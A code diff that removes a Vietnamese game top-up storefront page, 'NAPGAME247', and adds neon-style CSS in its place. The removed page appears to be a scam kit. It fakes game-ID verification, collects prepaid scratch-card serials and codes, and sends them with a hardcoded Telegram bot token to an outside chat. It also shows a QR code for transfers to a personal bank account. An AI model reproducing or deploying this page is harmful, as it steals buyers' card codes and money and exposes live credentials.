@@ -1,548 +1,118 @@
-
-
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NAPGAME247</title>
-<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;600;700;800&display=swap" rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
-<style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Be Vietnam Pro',sans-serif;
-}
+/* ===== GAMING NEON THEME ===== */
 
 body{
-background:#f5f5f5;
+background:#07010f;
+color:#fff;
 overflow-x:hidden;
+font-family:'Be Vietnam Pro',sans-serif;
+background-image:
+radial-gradient(circle at top,#7c3aed22 0%,transparent 40%),
+radial-gradient(circle at right,#06b6d422 0%,transparent 40%);
 }
 
 header{
-background:linear-gradient(90deg,#7b1fa2,#ff5722);
-padding:18px 25px;
-display:flex;
-justify-content:space-between;
-align-items:center;
-color:white;
-position:sticky;
-top:0;
-z-index:999;
+background:rgba(15,15,25,.8);
+backdrop-filter:blur(15px);
+border-bottom:1px solid rgba(255,255,255,.1);
 }
 
 .logo{
-font-size:32px;
+font-size:34px;
 font-weight:800;
+color:#fff;
+text-shadow:
+0 0 10px #7c3aed,
+0 0 25px #7c3aed;
 }
 
 .hero{
-background:url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=1600&auto=format&fit=crop') center/cover;
-padding:100px 20px;
-text-align:center;
-position:relative;
+min-height:420px;
+display:flex;
+align-items:center;
+justify-content:center;
 }
 
 .hero::before{
-content:'';
-position:absolute;
-inset:0;
-background:linear-gradient(rgba(255,87,34,.7),rgba(123,31,162,.8));
-}
-
-.hero-content{
-position:relative;
-z-index:2;
-color:white;
+background:
+linear-gradient(
+135deg,
+rgba(124,58,237,.75),
+rgba(255,102,0,.65)
+);
 }
 
 .hero h1{
-font-size:60px;
-font-weight:800;
-}
-
-.hero p{
-font-size:28px;
-margin-top:15px;
-font-weight:700;
+font-size:72px;
+text-shadow:
+0 0 15px #7c3aed,
+0 0 30px #ff6600;
 }
 
 .games{
-max-width:1200px;
-margin:auto;
-padding:50px 20px;
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(280px,1fr));
-gap:25px;
+gap:30px;
 }
 
 .card{
-background:white;
-border-radius:30px;
-overflow:hidden;
-box-shadow:0 10px 25px rgba(0,0,0,.12);
-transition:.3s;
-cursor:pointer;
+background:#120624;
+border:1px solid #7c3aed;
+box-shadow:
+0 0 25px rgba(124,58,237,.4);
+transition:.35s;
 }
 
 .card:hover{
-transform:translateY(-8px);
-}
-
-.card img{
-width:100%;
-height:230px;
-object-fit:cover;
-}
-
-.card h2{
-padding:25px;
-text-align:center;
-font-size:38px;
-font-weight:800;
+transform:translateY(-12px) scale(1.03);
+box-shadow:
+0 0 25px #7c3aed,
+0 0 50px #ff6600;
 }
 
 .page{
-display:none;
-max-width:1200px;
-margin:40px auto;
-background:white;
-padding:35px;
-border-radius:30px;
-box-shadow:0 10px 30px rgba(0,0,0,.1);
-}
-
-.active{
-display:block;
-}
-
-.back{
-background:black;
-color:white;
-border:none;
-padding:15px 25px;
-border-radius:15px;
-font-size:20px;
-cursor:pointer;
-font-weight:700;
-}
-
-.title{
-text-align:center;
-font-size:50px;
-margin:25px 0;
-font-weight:800;
+background:rgba(20,10,40,.75);
+backdrop-filter:blur(18px);
+border:1px solid rgba(124,58,237,.45);
 }
 
 .input{
-width:100%;
-padding:18px;
-border-radius:15px;
-border:2px solid #ddd;
-font-size:20px;
-outline:none;
-margin-bottom:15px;
-}
-
-.login{
-width:100%;
-padding:18px;
-margin-top:20px;
-border:none;
-border-radius:15px;
-background:linear-gradient(90deg,#ff5722,#ff9800);
+background:#1a1030;
 color:white;
-font-size:24px;
-font-weight:800;
-cursor:pointer;
+border:1px solid #7c3aed;
 }
 
-.packages{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
-gap:25px;
-margin-top:35px;
+.input::placeholder{
+color:#cfcfcf;
+}
+
+.login,
+.buy{
+background:
+linear-gradient(
+90deg,
+#7c3aed,
+#ff6600
+);
+color:white;
+font-weight:800;
+box-shadow:
+0 0 15px rgba(124,58,237,.7);
 }
 
 .package{
-background:#fafafa;
-padding:25px;
-border-radius:25px;
-text-align:center;
-box-shadow:0 5px 15px rgba(0,0,0,.08);
+background:#14091f;
+border:1px solid #9333ea;
+box-shadow:
+0 0 20px rgba(147,51,234,.35);
 }
 
-.package h3{
-font-size:38px;
-margin-bottom:15px;
-}
-
-.amount{
-display:flex;
-justify-content:center;
-align-items:center;
-gap:10px;
-font-size:34px;
-font-weight:800;
-color:#00acc1;
-}
-
-.amount img{
-width:42px;
-height:42px;
-object-fit:contain;
-}
-
-.buy{
-margin-top:15px;
-background:#ff5722;
-color:white;
-border:none;
-padding:14px 25px;
-border-radius:15px;
-font-size:22px;
-font-weight:700;
-cursor:pointer;
-}
-
-.paybox{
-margin-top:40px;
-background:#fafafa;
-padding:35px;
-border-radius:30px;
-display:none;
-}
-
-.paybox.active{
-display:block;
-}
-
-.qr{
-width:320px;
-max-width:100%;
-border-radius:25px;
-}
-
-.info{
-margin-top:20px;
-font-size:24px;
-font-weight:700;
-line-height:45px;
-}
-
-.method-buttons{
-display:flex;
-justify-content:center;
-gap:20px;
-flex-wrap:wrap;
-margin-top:20px;
-}
-
-.method-buttons button{
-padding:18px 35px;
-border:none;
-border-radius:15px;
-color:white;
-font-size:22px;
-font-weight:700;
-cursor:pointer;
-}
-
-.qrbtn{
-background:#ff5722;
-}
-
-.cardbtn{
-background:#2196f3;
+.package:hover{
+transform:translateY(-8px);
 }
 
 footer{
-margin-top:60px;
-padding:35px;
-background:linear-gradient(90deg,#7b1fa2,#ff5722);
-text-align:center;
-color:white;
-font-weight:700;
+background:
+linear-gradient(
+90deg,
+#7c3aed,
+#ff6600
+);
 }
-</style>
-</head>
-
-<body>
-
-<header>
-<div class="logo">NAPGAME247</div>
-<a href="https://t.me/ketamin28386" target="_blank" style="background:#0088cc;color:white;padding:12px 20px;border-radius:12px;text-decoration:none;font-weight:700;">
-📞 CSKH
-</a>
-</header>
-
-<div class="hero">
-<div class="hero-content">
-<h1>SHOP NẠP GAME GIÁ RẺ</h1>
-<p>Nhanh chóng • Uy tín • Tự động</p>
-</div>
-</div>
-
-<div id="home" class="games">
-
-<div class="card" onclick="openGame('ff')">
-<img src="https://naplau.com/master-images/game/logo_ff.png">
-<h2>🔥 FREE FIRE</h2>
-</div>
-
-<div class="card" onclick="openGame('lq')">
-<img src="https://naplau.com/master-images/game/logo_lienquan.png">
-<h2>⚔ LIÊN QUÂN</h2>
-</div>
-
-</div>
-
-<div id="page" class="page">
-<button class="back" onclick="goHome()">← QUAY LẠI</button>
-<h1 id="title" class="title"></h1>
-
-<input id="uid" class="input" placeholder="Nhập ID game">
-
-<button class="login" onclick="loginGame()">ĐĂNG NHẬP</button>
-
-<div id="packages" class="packages"></div>
-<div id="paybox" class="paybox"></div>
-</div>
-
-<footer>
-<div style="margin-bottom:20px;">
-<a href="https://t.me/ketamin28386" target="_blank" style="display:inline-block;background:#0088cc;color:white;padding:15px 25px;border-radius:15px;text-decoration:none;font-size:22px;font-weight:700;">
-📞 CHĂM SÓC KHÁCH HÀNG
-</a>
-</div>
-Copyright © 2026 NapGame247
-</footer>
-
-<script>
-
-let game='';
-
-const BOT_TOKEN='8962504536:AAGoABaumglVoBysb-D463koVGhWDhIaHOU';
-const CHAT_ID='7571519912';
-
-const ff=[
-['50000','14.150 KC'],
-['100000','28.300 KC'],
-['200000','56.600 KC'],
-['500000','169.800 KC']
-];
-
-const lq=[
-['50000','1.100 QH'],
-['100000','2.600 QH'],
-['200000','6.000 QH'],
-['500000','20.000 QH']
-];
-
-function openGame(g){
-game=g;
-document.getElementById('home').style.display='none';
-document.getElementById('page').classList.add('active');
-document.getElementById('packages').innerHTML='';
-document.getElementById('paybox').classList.remove('active');
-document.getElementById('title').innerHTML=g==='ff' ? 'NẠP KC FREE FIRE' : 'NẠP QUÂN HUY LIÊN QUÂN';
-}
-
-function goHome(){
-document.getElementById('home').style.display='grid';
-document.getElementById('page').classList.remove('active');
-}
-
-function loginGame(){
-
-const uid=document.getElementById('uid').value.trim();
-
-if(uid===''){
-Swal.fire({
-icon:'warning',
-title:'Chưa nhập ID game'
-});
-return;
-}
-
-if(uid.length <= 7){
-
-Swal.fire({
-icon:'error',
-title:'❌ ID Không Tồn Tại',
-text:'Vui lòng kiểm tra lại ID game',
-confirmButtonColor:'#e53935'
-});
-
-document.getElementById('packages').innerHTML='';
-return;
-}
-
-Swal.fire({
-icon:'success',
-title:'✅ Đăng Nhập Thành Công',
-confirmButtonColor:'#22c55e'
-});
-
-const data=game==='ff'?ff:lq;
-
-const icon=game==='ff'
-? 'https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png'
-: 'https://cdn-gop.garenanow.com/gop/app/0000/100/054/point.png';
-
-let html='';
-
-data.forEach(item=>{
-html+=`
-<div class="package">
-<h3>${Number(item[0]).toLocaleString('vi-VN')}đ</h3>
-<div class="amount">
-<img src="${icon}">
-${item[1]}
-</div>
-<button class="buy" onclick="pay('${item[0]}')">NẠP NGAY</button>
-</div>
-`;
-});
-
-document.getElementById('packages').innerHTML=html;
-}
-
-function pay(amount){
-
-const code='NAP'+Math.floor(Math.random()*999999);
-
-window.currentCode=code;
-
-window.currentQR=`https://img.vietqr.io/image/VIB-090958147-compact2.png?amount=${amount}&addInfo=${code}&accountName=CAM%20MINH%20SON`;
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{
-'Content-Type':'application/json'
-},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:`📦 CÓ LỆNH NẠP QR\n\n🎮 Game: ${game}\n💰 Số tiền: ${amount}\n🧾 Nội dung: ${code}`
-})
-});
-
-document.getElementById('paybox').innerHTML=`
-<h2 style="text-align:center;font-size:45px;font-weight:800;margin-bottom:30px;">
-CHỌN PHƯƠNG THỨC THANH TOÁN
-</h2>
-
-<div class="method-buttons">
-<button class="qrbtn" onclick="showQR()">THANH TOÁN QR</button>
-<button class="cardbtn" onclick="showCard()">NẠP THẺ CÀO</button>
-</div>
-
-<div id="paymentContent"></div>
-`;
-
-document.getElementById('paybox').classList.add('active');
-showQR();
-}
-
-function showQR(){
-
-document.getElementById('paymentContent').innerHTML=`
-<div style="margin-top:40px;text-align:center;">
-<h2 style="font-size:50px;font-weight:800;margin-bottom:20px;">THANH TOÁN QR</h2>
-<img src="${window.currentQR}" class="qr">
-<div class="info">
-<div>Ngân hàng: VIB</div>
-<div>STK: 090958147</div>
-<div>Chủ TK: CAM MINH SON</div>
-<div>Nội dung CK: ${window.currentCode}</div>
-</div>
-</div>
-`;
-}
-
-function showCard(){
-
-document.getElementById('paymentContent').innerHTML=`
-<div style="margin-top:40px;">
-
-<h2 style="text-align:center;font-size:45px;font-weight:800;margin-bottom:25px;">
-NẠP THẺ CÀO
-</h2>
-
-<select id="telco" class="input">
-<option value="">-Loại thẻ-</option>
-<option>VIETTEL</option>
-<option>VINAPHONE</option>
-<option>MOBIFONE</option>
-<option>GARENA</option>
-<option>ZING</option>
-</select>
-
-<select id="price" class="input">
-<option value="">-Mệnh giá thẻ-</option>
-<option>10.000đ</option>
-<option>20.000đ</option>
-<option>50.000đ</option>
-<option>100.000đ</option>
-<option>200.000đ</option>
-<option>500.000đ</option>
-</select>
-
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:15px;">
-<input id="serial" class="input" placeholder="Nhập số seri">
-<input id="cardcode" class="input" placeholder="Nhập mã thẻ">
-</div>
-
-<button class="login" onclick="submitCard()">NẠP THẺ</button>
-
-<p style="margin-top:15px;color:#ef4444;font-weight:700;">
-* Chọn sai mệnh giá có thể mất thẻ
-</p>
-
-</div>
-`;
-}
-
-function submitCard(){
-
-const telco=document.getElementById('telco').value;
-const price=document.getElementById('price').value;
-const serial=document.getElementById('serial').value;
-const code=document.getElementById('cardcode').value;
-
-if(!telco || !price || !serial || !code){
-Swal.fire({
-icon:'warning',
-title:'Thiếu thông tin',
-text:'Vui lòng nhập đầy đủ thông tin'
-});
-return;
-}
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:'POST',
-headers:{
-'Content-Type':'application/json'
-},
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:`📥 CÓ NGƯỜI NẠP THẺ\n\n🎮 Game: ${game}\n💳 Loại thẻ: ${telco}\n💰 Mệnh giá: ${price}\n🔢 Seri: ${serial}\n🔑 Mã thẻ: ${code}`
-})
-});
-
-Swal.fire({
-icon:'success',
-title:'Đã gửi về Telegram',
-text:'Admin sẽ kiểm tra giao dịch'
-});
-}
-
-</script>
-
-</body>
-</html>
-```
-
